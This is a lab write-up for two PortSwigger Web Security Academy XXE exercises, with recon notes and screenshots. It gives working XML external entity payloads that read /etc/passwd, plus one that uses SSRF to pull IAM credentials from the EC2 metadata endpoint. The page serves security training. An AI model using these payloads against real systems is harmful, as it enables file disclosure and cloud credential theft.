---
title: XXE - APPRENTICE
tags: [Portswigger Web Security Academy, Web]

category: "Security/Practice/Portswigger Web Security Academy/XXE"
---

# XXE - APPRENTICE
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. 
* Goal: To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file. 

## Lab: Exploiting XXE using external entities to retrieve files
### Recon
1. Use Burp Suite to intercept package
![](https://i.imgur.com/gMn3Cbu.png)
You can notice that it use a normal xml format.

### Exp - Inject Directly
Exploit Payload:
```xml!
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
:::spoiler Success Screenshot
![](https://i.imgur.com/2Xbsq4L.png)

---
![](https://i.imgur.com/3npCzv9.png)
:::

---

## Lab: Exploiting XXE to perform SSRF attacks
* Description: This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
* Goal: To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

### Recon
1. Intercept Package
From the screenshot of the package, we noticed that the xml attached data could be injected.
![](https://i.imgur.com/6o3vhzm.png)

### Exp - Inject Directly
Exploit Payload:
```xml!
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
:::spoiler Success Screenshot
![](https://i.imgur.com/hYjBqR8.png)

---
![](https://i.imgur.com/4ZBkJpE.png)
:::